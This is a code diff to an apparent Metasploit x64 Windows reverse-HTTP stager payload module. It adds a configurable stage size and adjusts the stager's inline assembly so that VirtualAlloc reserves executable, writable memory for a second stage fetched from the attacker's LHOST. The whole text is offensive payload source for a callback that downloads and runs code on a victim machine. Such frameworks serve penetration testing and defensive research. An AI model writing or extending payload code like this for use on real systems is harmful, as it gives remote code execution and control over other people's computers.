@@ -44,7 +44,8 @@ module Payload::Windows::ReverseHttp_x64
       host:        ds['LHOST'] || '127.127.127.127',
       port:        ds['LPORT'],
       retry_count: ds['StagerRetryCount'],
-      retry_wait:  ds['StagerRetryWait']
+      retry_wait:  ds['StagerRetryWait'],
+      size:        ds['StagerStagePayloadSize'] || 0x400000
     }
 
     # add extended options if we do have enough space
@@ -231,6 +232,12 @@ module Payload::Windows::ReverseHttp_x64
         0x00080000 | # INTERNET_FLAG_NO_COOKIES
         0x00000200 ) # INTERNET_FLAG_NO_UI
     end
+
+    shift_size = 16
+    while opts[:size] > (0x40 << shift_size) do
+      shift_size += 1
+    end
+
 
     asm = %Q^
         xor rbx, rbx
@@ -448,7 +455,7 @@ module Payload::Windows::ReverseHttp_x64
         push 0x40
         pop rdx
         mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
-        shl edx, 16                   ; dwSize
+        shl edx, #{"0x%.8x" % shift_size} ; dwSize
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
@@ -506,5 +513,3 @@ module Payload::Windows::ReverseHttp_x64
 end
 
 end
-
-
